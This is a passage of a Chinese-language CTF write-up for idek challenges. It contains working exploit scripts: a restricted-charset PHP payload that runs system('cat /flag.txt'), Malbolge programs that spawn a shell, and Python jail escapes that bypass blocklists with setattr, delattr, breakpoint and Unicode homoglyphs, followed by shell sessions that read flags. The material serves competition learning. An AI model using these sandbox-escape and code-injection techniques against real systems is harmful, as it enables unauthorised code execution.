+ <span class="hljs-string">&#x27;m&#x27;</span>: (<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)}
+ In <span class="hljs-selector-attr">[216]</span>: for func in phpfuncs:
+     ...:     if <span class="hljs-built_in">all</span>(c in mapping for c in func):
+     ...:         <span class="hljs-built_in">print</span>(func)
+     ...:
+sqrt
+strspn
+strstr
+strtr</code></pre><p>多了一个 <code>strspn</code> 那么现在就有任意数字了，接下来就想办法构造 <code>chr</code> 函数：</p>
+<pre class="hljs"><code><span class="hljs-symbol">&#x27;c</span><span class="hljs-symbol">&#x27;:</span> (&#x27;[&#x27;, <span class="hljs-symbol">&#x27;8</span>&#x27;)
+<span class="hljs-symbol">&#x27;h</span><span class="hljs-symbol">&#x27;:</span> (&#x27;[&#x27;, <span class="hljs-symbol">&#x27;3</span>&#x27;)
+<span class="hljs-symbol">&#x27;r</span><span class="hljs-symbol">&#x27;:</span> (&#x27;[&#x27;, &#x27;)&#x27;)</code></pre><p><code>chr</code> 出了就可以开始写 exp 了：</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+s      = <span class="hljs-string">&quot;(&#x27;[&#x27;^&#x27;(&#x27;)&quot;</span>
+<span class="hljs-built_in">str</span>    = <span class="hljs-string">f&quot;<span class="hljs-subst">{s}</span>.(&#x27;)&#x27;^&#x27;]&#x27;).(&#x27;[&#x27;^&#x27;)&#x27;)&quot;</span>
+strstr = <span class="hljs-string">f&quot;<span class="hljs-subst">{<span class="hljs-built_in">str</span>}</span>.<span class="hljs-subst">{<span class="hljs-built_in">str</span>}</span>&quot;</span>
+sqrt   = <span class="hljs-string">f&quot;<span class="hljs-subst">{s}</span>.(&#x27;,&#x27;^&#x27;]&#x27;).(&#x27;[&#x27;^&#x27;)&#x27;).(&#x27;)&#x27;^&#x27;]&#x27;)&quot;</span>
+zero   = <span class="hljs-string">f&quot;(<span class="hljs-subst">{sqrt}</span>)((<span class="hljs-subst">{strstr}</span>)(&#x27;.&#x27;,&#x27;,&#x27;)).&#x27;&#x27;&quot;</span>
+strspn = <span class="hljs-string">f&quot;<span class="hljs-subst">{<span class="hljs-built_in">str</span>}</span>.<span class="hljs-subst">{s}</span>.(&#x27;.&#x27;^&#x27;^&#x27;).(&#x27;^&#x27;^<span class="hljs-subst">{zero}</span>)&quot;</span>
+num    = <span class="hljs-keyword">lambda</span> x:<span class="hljs-string">f&quot;(<span class="hljs-subst">{strspn}</span>)(&#x27;<span class="hljs-subst">{<span class="hljs-string">&#x27;.&#x27;</span> * x}</span>&#x27;,&#x27;.&#x27;)&quot;</span>
+phpchr = <span class="hljs-keyword">lambda</span> x:<span class="hljs-string">f&quot;((&#x27;[&#x27;^<span class="hljs-subst">{num(<span class="hljs-number">8</span>)}</span>.&#x27;&#x27;).(&#x27;[&#x27;^<span class="hljs-subst">{num(<span class="hljs-number">3</span>)}</span>.&#x27;&#x27;).(&#x27;[&#x27;^&#x27;)&#x27;))(<span class="hljs-subst">{num(<span class="hljs-built_in">ord</span>(x))}</span>)&quot;</span>
+phpstr = <span class="hljs-keyword">lambda</span> <span class="hljs-built_in">str</span>:<span class="hljs-string">&#x27;.&#x27;</span>.join([phpchr(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>])
+
+payload = <span class="hljs-string">f&quot;(<span class="hljs-subst">{phpstr(<span class="hljs-string">&#x27;system&#x27;</span>)}</span>)(<span class="hljs-subst">{phpstr(<span class="hljs-string">&#x27;cat /flag.txt&#x27;</span>)}</span>)&quot;</span>
+<span class="hljs-built_in">print</span>(payload)
+
+r = remote(<span class="hljs-string">&#x27;phpfun.chal.idek.team&#x27;</span>, <span class="hljs-number">1337</span>)
+r.recvuntil(<span class="hljs-string">b&#x27;Input script: &#x27;</span>)
+r.sendline(payload.encode())
+r.interactive()</code></pre><h3 id="manager-of-the-year-i"><a class="header-link" href="#manager-of-the-year-i"></a>Manager Of The Year I:</h3>
+<p>此题和AI毫无关系，训练数据和x全都是多余的
+如果第一个数是y，可以第一次全猜0，第二次第一个数是1，其他是0，这样就从MSE可以得到y^2-(y-1)^2=2y-1，从而可以知道y。猜366次就能知道每个数</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> re
+conn=remote(<span class="hljs-string">&quot;manager-of-the-year-1.chal.idek.team&quot;</span>,<span class="hljs-number">1337</span>)
+conn.sendline()
+conn.recvuntil(<span class="hljs-string">&quot;) for 2023:&quot;</span>)
+conn.sendline(<span class="hljs-string">&quot; &quot;</span>.join([<span class="hljs-string">&quot;0&quot;</span>]*<span class="hljs-number">365</span>))
+u=conn.recvuntil(<span class="hljs-string">&quot;) for 2023:&quot;</span>)
+u=(<span class="hljs-built_in">float</span>(re.findall(<span class="hljs-string">b&quot;\((.*?)\)&quot;</span>,u)[<span class="hljs-number">0</span>])**<span class="hljs-number">2</span>)*<span class="hljs-number">365</span>
+z=[]
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">365</span>):
+    <span class="hljs-built_in">print</span>(i)
+    conn.sendline(<span class="hljs-string">&quot; &quot;</span>.join([<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-keyword">if</span> j==i <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;0&quot;</span> <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">365</span>)]))
+    v=conn.recvuntil(<span class="hljs-string">&quot;) for 2023:&quot;</span>)
+    v=(<span class="hljs-built_in">float</span>(re.findall(<span class="hljs-string">b&quot;\((.*?)\)&quot;</span>,v)[<span class="hljs-number">0</span>])**<span class="hljs-number">2</span>)*<span class="hljs-number">365</span>
+    z.append((u-v+<span class="hljs-number">1</span>)/<span class="hljs-number">2</span>)
+conn.sendline(<span class="hljs-string">&quot; &quot;</span>.join([<span class="hljs-built_in">str</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> z]))
+conn.interactive()</code></pre><h3 id="manager-of-the-year-2"><a class="header-link" href="#manager-of-the-year-2"></a>Manager Of The Year 2:</h3>
+<p>此题和AI也毫无关系，本质上是一个高维优化题目，对365个变量的每个进行一次golden-section search，就能把MSE降低到要求</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> re
+conn=remote(<span class="hljs-string">&quot;manager-of-the-year-2.chal.idek.team&quot;</span>,<span class="hljs-number">1337</span>)
+conn.sendline()
+<span class="hljs-built_in">print</span>(conn.recvuntil(<span class="hljs-string">&quot;) for 2023:&quot;</span>))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">guess</span>(<span class="hljs-params">v</span>):</span>
+    conn.sendline(<span class="hljs-string">&quot; &quot;</span>.join([<span class="hljs-built_in">str</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> v]))
+    u=conn.recvuntil(<span class="hljs-string">&quot;) for 2023:&quot;</span>, timeout=<span class="hljs-number">1</span>)
+    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;neural&#x27;</span> <span class="hljs-keyword">in</span> u
+
+<span class="hljs-keyword">import</span> math
+gr=(math.sqrt(<span class="hljs-number">5</span>)-<span class="hljs-number">1</span>)/<span class="hljs-number">2</span>
+v=[<span class="hljs-number">100</span>*gr*gr]*<span class="hljs-number">365</span>
+guess(v)
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">365</span>):
+    l=<span class="hljs-number">0</span>
+    ll=<span class="hljs-number">100</span>*gr*gr
+    rr=<span class="hljs-number">100</span>*gr
+    r=<span class="hljs-number">100</span>
+    guesscnt=<span class="hljs-number">0</span>
+    <span class="hljs-keyword">while</span> (guesscnt&lt;<span class="hljs-number">18</span>) <span class="hljs-keyword">or</span> (guesscnt==<span class="hljs-number">18</span> <span class="hljs-keyword">and</span> rr-ll&gt;<span class="hljs-number">0.1187</span>):
+        oldv=v[:]
+        v[i]=rr
+        guesscnt=guesscnt+<span class="hljs-number">1</span>
+        <span class="hljs-keyword">if</span> guess(v):
+            guesscnt=guesscnt+<span class="hljs-number">1</span>
+            v=oldv[:]
+            t=guess(v)
+            r=rr
+            rr=ll
+            ll=gr*l+gr*gr*r
+            l,ll,rr,r=r,rr,ll,l
+        <span class="hljs-keyword">else</span>:
+            l=ll
+            ll=rr
+            rr=gr*r+gr*gr*l
+    <span class="hljs-built_in">print</span>(i)
+
+conn.sendline(<span class="hljs-string">&quot; &quot;</span>.join([<span class="hljs-built_in">str</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> v]))
+conn.interactive()</code></pre><h3 id="malbolge-i-gluttony"><a class="header-link" href="#malbolge-i-gluttony"></a>Malbolge I: Gluttony</h3>
+<p>构造一个类似 echo 的 opcode</p>
+<pre class="hljs"><code>op*<span class="hljs-regexp">/&lt;/</span>&lt;<span class="hljs-regexp">/&lt;/</span>&lt;<span class="hljs-regexp">/&lt;/</span>&lt;<span class="hljs-regexp">/&lt;/</span>&lt;<span class="hljs-regexp">/&lt;/</span>&lt;<span class="hljs-regexp">/&lt;/</span>&lt;<span class="hljs-regexp">/&lt;/</span>&lt;<span class="hljs-regexp">/&lt;/</span>&lt;<span class="hljs-regexp">/&lt;/</span>&lt;<span class="hljs-regexp">/&lt;/</span>&lt;<span class="hljs-regexp">/&lt;/</span>&lt;<span class="hljs-regexp">/&lt;/</span>&lt;<span class="hljs-regexp">/&lt;/</span>&lt;<span class="hljs-regexp">/&lt;/</span>&lt;/&lt;</code></pre><p>转换为Malbolge标准形式</p>
+<pre class="hljs"><code><span class="hljs-attribute">D</span>=%r_p]n[lYjWhUfSdQbO`M^K\IZGXEVCTAR?P=N;L<span class="hljs-number">9</span>J<span class="hljs-number">7</span>H<span class="hljs-number">5</span>F<span class="hljs-number">3</span>D<span class="hljs-number">1</span>B/@-&gt;+&lt;):&#x27;</code></pre><p>然后就可以任意输入要执行的代码了，比如</p>
+<pre class="hljs"><code><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).system(<span class="hljs-string">&quot;sh&quot;</span>)</code></pre><h3 id="malbolge-ii-greed"><a class="header-link" href="#malbolge-ii-greed"></a>Malbolge II: Greed</h3>
+<p>这次不能用stdin了，同时还把crazy操作的函数改为每次随机的映射表。用这里的生成器<a href="https://github.com/wallstop/MalbolgeGenerator，同样修改crazyOperation函数，再尝试生成即可。注意到有一些crazy表比较容易生成，所以需要多尝试交互几次。">https://github.com/wallstop/MalbolgeGenerator，同样修改crazyOperation函数，再尝试生成即可。注意到有一些crazy表比较容易生成，所以需要多尝试交互几次。</a></p>
+<p>比较短的代码应该更容易生成，因此使用</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-title">eval</span>(<span class="hljs-title">input</span>())</span></code></pre><p>当时成功的数据如下</p>
+<pre class="hljs"><code>crazy = [[2, 1, 1], [0, 1, 0], [2, 0, 2]] 
+DCB<span class="hljs-variable">$@</span>?!=65498x054-,1q).-m%*j<span class="hljs-string">&quot;!~}<span class="hljs-variable">$#</span>&quot;</span>!~`|{tsxqYonmrqSRhmledcKaf_d]b[ZYAWV&gt;T&lt;;W9U7ML4POHMLKDhHG
+FE&gt;b%A:<span class="hljs-string">&quot;&gt;~&lt;;43W1w/u-2+*)on&amp;l<span class="hljs-variable">$ji</span>!g%|dzya`|utyxqvunVUkpinglNdibg`_dc\a`B^@VU=SRWVUNSRQ32H0LEJC
+g*@EDC&lt;;:&quot;</span>!~&lt;;:98xUv43,1qpo<span class="hljs-string">&#x27;,+k)&quot;!&amp;%e{&quot;!a`v{z\[wYonVrTjohPfkMLba`HGc\DZBX@?U=SRQ9UTSR4PIHGFE
+DCB*F?&#x27;</span>&amp;%;:<span class="hljs-string">&quot;8~6;{z270/43srqp(nm%k#&quot;</span><span class="hljs-string">&#x27;&amp;}e{cbx`|{tyrqYutmUkpohmONjLhJI_^FE[`_AWV[T&lt;R:P87M5Q3OHM
+FEi,BAe?cC%$#?&gt;7&lt;5{3yxw/432r0p(n&amp;+*#(&#x27;</span>gf|{<span class="hljs-string">&quot;ya`|{]sxqYuWsrTjohgOkdcKJ`edc\[C_XW?UT&lt;X:P8TMRKoI
+1M/KJ,+GF(DC%$:&quot;</span><span class="hljs-attribute">8</span>=&lt;;{3WxU5.-s+*)(-&amp;l<span class="hljs-variable">$j</span><span class="hljs-string">&quot;&#x27;&amp;}e{zyxwv^tyrqpuWVUkSRhPfkMLbaIeGF\DC_A@VUZSR:9ONSL4
+3ON0LK-C+*@(&gt;&amp;BA@9!7&lt;|43y7w5.32+*).-,+*j(h&amp;%<span class="hljs-variable">$dzbaw_</span>{]srZvoWsrkjohgfkjcba`eG]ba`YA]\&gt;=SX:VU7S
+RKPIH0FKJC+*F?&gt;=&lt;A@&quot;</span><span class="hljs-attribute">8</span>=&lt;;{X8VC </code></pre><h3 id="malbolge-iii-wrath"><a class="header-link" href="#malbolge-iii-wrath"></a>Malbolge III: Wrath</h3>
+<p>同样用生成器<a href="https://github.com/wallstop/MalbolgeGenerator，修改">https://github.com/wallstop/MalbolgeGenerator，修改</a> findString 函数的 count 阈值，可以搜到更短的Malbolge代码，我改到了 10 </p>
+<p>依然用</p>
+<pre class="hljs"><code><span class="hljs-built_in">eval</span>(<span class="hljs-built_in">input</span>())</code></pre><p>搜到了这个</p>
+<pre class="hljs"><code><span class="hljs-symbol">&#x27;C</span>&lt;;:?<span class="hljs-number">87</span>[;:<span class="hljs-number">3216543</span>,P*/.-,+*#<span class="hljs-string">&quot;!E%${zy~w=^ts[wpunVrTji/PledLbJIHG]\aZBAW?UT&lt;X:VUTSLKJ2HMLK-CgA
+@?D&amp;%;:9!=6;43W70/S-,+0)M-&amp;+$H&quot;</span>!&amp;%|#z!~wv{tyxqYoWmlkpihmle+iba<span class="hljs-symbol">&#x27;e</span>%p</code></pre><h3 id="malbolge3-revenge"><a class="header-link" href="#malbolge3-revenge"></a>Malbolge3 Revenge:</h3>
+<p>这次不能用eval了，考虑直接使用os.system</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-title">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;sh&#x27;</span>)</span></code></pre><p>由于题目用了exec，可以执行多条代码，所以可以用这个更短的</p>
+<pre class="hljs"><code><span class="hljs-keyword">import</span> <span class="hljs-built_in">os</span>;<span class="hljs-built_in">os</span>.system(<span class="hljs-string">&quot;sh&quot;</span>)</code></pre><p>通过搜索发现了一个比较高效的生成器<a href="http://zb3.me/malbolge-tools/#generator，用它的第二个模式生成，Max">http://zb3.me/malbolge-tools/#generator，用它的第二个模式生成，Max</a> branches between progress设成7就可以找到满足长度要求的结果</p>
+<pre class="hljs"><code>(&amp;B;_#<span class="hljs-number">87</span><span class="hljs-literal">[}<span class="hljs-number">43</span>W<span class="hljs-identifier">y0</span><span class="hljs-operator">/</span>S<span class="hljs-identifier">u</span>,+O<span class="hljs-identifier">q</span>(&#x27;K<span class="hljs-identifier">mkHih</span>~D<span class="hljs-identifier">f</span>{<span class="hljs-identifier">z</span>@&gt;<span class="hljs-identifier">a_N</span>;:<span class="hljs-identifier">xqY6WWVk1</span><span class="hljs-operator">/</span>{<span class="hljs-identifier">g</span>,<span class="hljs-identifier">kd</span><span class="hljs-operator">*</span>L<span class="hljs-identifier">t</span>`H%<span class="hljs-identifier">cF</span>!D<span class="hljs-identifier">_B</span>|<span class="hljs-identifier">z</span>&gt;<span class="hljs-identifier">yf</span>+<span class="hljs-identifier">dctr7_p</span>]</span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">O2lkE</span>.</span></span>hfG)db=&lt;A$^\J}<span class="hljs-number">5</span><span class="hljs-pattern-match">|<span class="hljs-constructor">XV70v</span>.3<span class="hljs-constructor">QP0qLKJI</span>[<span class="hljs-constructor">H(!Ef|{<span class="hljs-params">z</span>@<span class="hljs-params">b</span>`<span class="hljs-params">v</span>&lt;^\9Zputm3Uji<span class="hljs-operator">/</span>QOe+MKg`&amp;^<span class="hljs-params">cFaZ</span>~AW{?&gt;&lt;<span class="hljs-params">w</span>;99sq</span></span></code></pre><h3 id="niki"><a class="header-link" href="#niki"></a>Niki:</h3>
+<p>这道题是一个类似 Scratch 的东西，用附件里面的程序打开 <code>german_scrambled.pas</code> 就可以加载题目程序了：</p>
+<p class="img-container"><img src="https://i.imgur.com/jsXpftq.png" alt=""></p>
+<p>尝试运行之后发现这个程序有很多都是向下走的指令，但是默认那个机器人在左下角，再往下就会报错，而且初始的 Material（就相当于颜料数量）为0，画不了图案，所以点击左上角的格子按钮调整一下：</p>
+<p class="img-container"><img src="https://i.imgur.com/OqRDlL9.png" alt=""></p>
+<p>然后就会发现机器人会画很多东西出来，比较乱，而且后面还是会到边界报错，于是尝试一个函数一个函数跑：</p>
+<p class="img-container"><img src="https://i.imgur.com/0DtMwaA.png" alt=""></p>
+<p class="img-container"><img src="https://i.imgur.com/82zfHal.png" alt=""></p>
+<p>可以看到 <code>h;</code> 打出了一个大写的 P，然后挨个把文件里面的函数都运行一遍就有了下面的：</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-title">h</span> -&gt;</span> P
+<span class="hljs-function"><span class="hljs-title">o</span> -&gt;</span> S
+<span class="hljs-function"><span class="hljs-title">brackl</span> -&gt;</span> (
+<span class="hljs-function"><span class="hljs-title">a</span> -&gt;</span> O
+<span class="hljs-function"><span class="hljs-title">v</span> -&gt;</span> E
+<span class="hljs-function"><span class="hljs-title">u</span> -&gt;</span> I
+<span class="hljs-function"><span class="hljs-title">brackr</span> -&gt;</span> )
+<span class="hljs-function"><span class="hljs-title">q</span> -&gt;</span> D
+<span class="hljs-function"><span class="hljs-title">p</span> -&gt;</span> K
+<span class="hljs-function"><span class="hljs-title">l</span> -&gt;</span> T</code></pre><p><code>PS(OEI)DKT</code> idek前缀都在，似乎就是 flag 了，简单处理一下得到 <code>idek{stop}</code></p>
+<h3 id="pyjail"><a class="header-link" href="#pyjail"></a>Pyjail:</h3>
+<p>代码是这样的</p>
+<pre class="hljs"><code>blocklist = [<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;{&#x27;</span>, <span class="hljs-string">&#x27;}&#x27;</span>,<span class="hljs-string">&#x27;:&#x27;</span>]
+DISABLE_FUNCTIONS = [<span class="hljs-string">&quot;getattr&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;breakpoint&quot;</span>, <span class="hljs-string">&quot;lambda&quot;</span>, <span class="hljs-string">&quot;help&quot;</span>]
+DISABLE_FUNCTIONS = {func: <span class="hljs-literal">None</span> <span class="hljs-keyword">for</span> func <span class="hljs-keyword">in</span> DISABLE_FUNCTIONS}</code></pre><p>有个blocklist ban掉了<code>&#39;.&#39;, &#39;\\&#39;, &#39;[&#39;, &#39;]&#39;, &#39;{&#39;, &#39;}&#39;,&#39;:&#39;</code>.然后有个<code>DISABLE_FUNCTIONS</code> 注册了关于<code>&quot;getattr&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;breakpoint&quot;, &quot;lambda&quot;, &quot;help&quot;</code>的None对象并且覆盖其<code>__builtins__</code>中的函数对应函数.同时文件名是<code>jail.py</code>,docker里的也是jail起来的所以可以用,<code>__import__(&#39;jail&#39;)</code>但是可能要输入两次,所以不如使用<code>__import__(__main__)</code></p>
+<p>同时flag设置权限了不能直接读 然后给了一个<code>readflag</code>,调用参数是<code>/readflag giveflag</code>即可</p>
+<p>同时本题可以多行执行,所以可以搞一些例如清空blocklist的操作 如下</p>
+<pre class="hljs"><code>welcome!
+<span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-built_in">setattr</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;__main__&#x27;</span>),<span class="hljs-string">&#x27;blocklist&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)</span>
+None
+<span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;sh&#x27;</span>)</span>
+sh: 0: can&#x27;t access tty; job control turned off
+$ ls
+jail.py  readflag.c
+$ ls /
+bin   ctf  etc   home  lib    media  opt   readflag  run   srv  tmp  var
+boot  dev  flag  kctf  lib64  mnt    proc  root      sbin  sys  usr
+$ /readflag giveflag
+idek{9eece9b4de9380bc3a41777a8884c185}</code></pre><p>当然还有第二个版本用<code>__import__(&#39;jail&#39;)</code>来进行加载,但是似乎得打两次 因为第一个导入了jail 等于重启了一次新的环境</p>
+<pre class="hljs"><code>welcome!
+<span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-built_in">setattr</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;jail&#x27;</span>),<span class="hljs-string">&#x27;blocklist&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)</span>
+welcome!
+<span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-built_in">setattr</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;jail&#x27;</span>),<span class="hljs-string">&#x27;blocklist&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)</span>
+None
+<span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;sh&#x27;</span>)</span>
+sh: 0: can&#x27;t access tty; job control turned off
+$ /readflag giveflag
+idek{9eece9b4de9380bc3a41777a8884c185}</code></pre><h3 id="pyjail-revenge"><a class="header-link" href="#pyjail-revenge"></a>Pyjail Revenge:</h3>
+<p>比赛中没做出 赛后复现</p>
+<p>Revenge版本的区别和正常版本的区别在于 blocklist 添加了<code>blocklist</code>,<code>globals</code>以及<code>compile</code></p>
+<pre class="hljs"><code><span class="hljs-attr">blocklist</span> = [<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;{&#x27;</span>, <span class="hljs-string">&#x27;}&#x27;</span>,<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&quot;blocklist&quot;</span>, <span class="hljs-string">&quot;globals&quot;</span>, <span class="hljs-string">&quot;compile&quot;</span>]</code></pre><p>同时只能一行输入,不能多次输入所以之前的办法目前是行不通.不过还有以下版本可以尝试</p>
+<h4 id="方法1-删除覆盖"><a class="header-link" href="#方法1-删除覆盖"></a>方法1 删除覆盖:</h4>
+<p>DISABLE_FUNCTIONS 注册了关于<code>&quot;getattr&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;breakpoint&quot;, &quot;lambda&quot;, &quot;help&quot;</code>的None对象并且覆盖其<code>__builtins__</code>中的函数对应函数,所以只要删除掉覆盖的全局变量就行</p>
+<p>那全局变量可以通过<code>globals()</code>,<code>vars()</code>,<code>locals()</code>等 当然也可以通过unicode的形式绕过<code>blocklist</code> 比如<code>gloｂals</code>类似的形式,这样就可以删掉<code>DISABLE_FUNCTIONS</code>里的函数然后将其调用.</p>
+<p>例如先用<code>setattr</code>将一些没用类的<code>__dict__</code>覆盖以<code>globals()</code>,<code>vars()</code>,<code>locals()</code>然后再通过<code>delattr</code>删掉那些<code>DISABLE_FUNCTIONS</code>,再进行调用</p>
+<p>比如以下:</p>
+<p>vars(),locals(）都可以用</p>
+<p>覆盖copyright 调用breakpoint函数</p>
+<pre class="hljs"><code>welcome!
+&gt;&gt;&gt; setattr(copyright,<span class="hljs-string">&#x27;__dict__&#x27;</span>,gloｂals()),delattr(copyright,<span class="hljs-string">&#x27;breakpoint&#x27;</span>),breakpoint()
+<span class="hljs-comment">--Return--</span>
+&gt; &lt;string&gt;(<span class="hljs-number">1</span>)&lt;module&gt;()-&gt;(<span class="hljs-keyword">None</span>, <span class="hljs-keyword">None</span>, <span class="hljs-keyword">None</span>)
+(Pdb) <span class="hljs-keyword">import</span> os;os.<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;sh&#x27;</span>)
+sh: <span class="hljs-number">0</span>: can<span class="hljs-string">&#x27;t access tty; job control turned off
+$ /readflag giveflag
+idek{what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!}
+
+welcome!
+&gt;&gt;&gt; setattr(copyright,&#x27;</span>__dict__<span class="hljs-string">&#x27;,vars()),delattr(copyright,&#x27;</span>breakpoint<span class="hljs-string">&#x27;),breakpoint()
+--Return--
+&gt; &lt;string&gt;(1)&lt;module&gt;()-&gt;(None, None, None)
+(Pdb) import os;os.system(&#x27;</span>sh<span class="hljs-string">&#x27;)
+sh: 0: can&#x27;</span>t <span class="hljs-keyword">access</span> tty; job control turned <span class="hljs-keyword">off</span>
+$ /readflag giveflag
+idek{what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!}
+
+welcome!
+&gt;&gt;&gt; setattr(copyright,<span class="hljs-string">&#x27;__dict__&#x27;</span>,locals()),delattr(copyright,<span class="hljs-string">&#x27;breakpoint&#x27;</span>),breakpoint()
+<span class="hljs-comment">--Return--</span>
+&gt; &lt;string&gt;(<span class="hljs-number">1</span>)&lt;module&gt;()-&gt;(<span class="hljs-keyword">None</span>, <span class="hljs-keyword">None</span>, <span class="hljs-keyword">None</span>)
+(Pdb) <span class="hljs-keyword">import</span> os;os.<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;sh&#x27;</span>)
+sh: <span class="hljs-number">0</span>: can<span class="hljs-string">&#x27;t access tty; job control turned off
+$ /readflag giveflag
+idek{what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!}</span></code></pre><p>覆盖license 调用breakpoint函数</p>
+<pre class="hljs"><code>welcome!
+&gt;&gt;&gt; setattr(license,<span class="hljs-string">&#x27;__dict__&#x27;</span>,gloｂals()),delattr(license,<span class="hljs-string">&#x27;breakpoint&#x27;</span>),breakpoint()
+<span class="hljs-comment">--Return--</span>
+&gt; &lt;string&gt;(<span class="hljs-number">1</span>)&lt;module&gt;()-&gt;(<span class="hljs-keyword">None</span>, <span class="hljs-keyword">None</span>, <span class="hljs-keyword">None</span>)
+(Pdb) <span class="hljs-keyword">import</span> os;os.<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;sh&#x27;</span>)
+sh: <span class="hljs-number">0</span>: can<span class="hljs-string">&#x27;t access tty; job control turned off
+$ /readflag giveflag
+idek{what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!}
+
+welcome!
+&gt;&gt;&gt; setattr(license,&#x27;</span>__dict__<span class="hljs-string">&#x27;,vars()),delattr(license,&#x27;</span>breakpoint<span class="hljs-string">&#x27;),breakpoint()
+--Return--
+&gt; &lt;string&gt;(1)&lt;module&gt;()-&gt;(None, None, None)
+(Pdb) import os;os.system(&#x27;</span>sh<span class="hljs-string">&#x27;)
+sh: 0: can&#x27;</span>t <span class="hljs-keyword">access</span> tty; job control turned <span class="hljs-keyword">off</span>
+$ /readflag giveflag
+idek{what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!}
+
+welcome!
+&gt;&gt;&gt; setattr(license,<span class="hljs-string">&#x27;__dict__&#x27;</span>,locals()),delattr(license,<span class="hljs-string">&#x27;breakpoint&#x27;</span>),breakpoint()
+<span class="hljs-comment">--Return--</span>
+&gt; &lt;string&gt;(<span class="hljs-number">1</span>)&lt;module&gt;()-&gt;(<span class="hljs-keyword">None</span>, <span class="hljs-keyword">None</span>, <span class="hljs-keyword">None</span>)
+(Pdb) <span class="hljs-keyword">import</span> os;os.<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;sh&#x27;</span>)
+sh: <span class="hljs-number">0</span>: can<span class="hljs-string">&#x27;t access tty; job control turned off
+$ /readflag giveflag
+idek{what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!}</span></code></pre><p>相关覆盖的参数可以找这些<a href="https://github.com/python/cpython/blob/c5660ae96f2ab5732c68c301ce9a63009f432d93/Lib/site.py#L400-L426">https://github.com/python/cpython/blob/c5660ae96f2ab5732c68c301ce9a63009f432d93/Lib/site.py#L400-L426</a></p>
+<pre class="hljs"><code>quit,copyright,<span class="hljs-keyword">exit</span>,license,credits</code></pre><p>当然由于这个版本他是这样的启动参数</p>
+<pre class="hljs"><code><span class="hljs-keyword">ENTRYPOINT</span><span class="bash"> socat \
+    TCP-LISTEN:1337,reuseaddr,fork,end-close \
+    EXEC:<span class="hljs-string">&quot;./jail.py&quot;</span>,pty,ctty,stderr,raw,<span class="hljs-built_in">echo</span>=0</span></code></pre><p>所以也可以删help() 然后利用help()再rce 但是远程环境可能有些限制导致/tmp 无了可能/tmp不可写只读 但是本地可以工作</p>
+<pre class="hljs"><code>welcome!
+&gt;&gt;&gt; setattr(license,<span class="hljs-string">&#x27;__dict__&#x27;</span>,locals()),delattr(license,<span class="hljs-string">&#x27;help&#x27;</span>),help()
+
+Welcome to Python <span class="hljs-number">3.8&#x27;</span>s help utility!
+
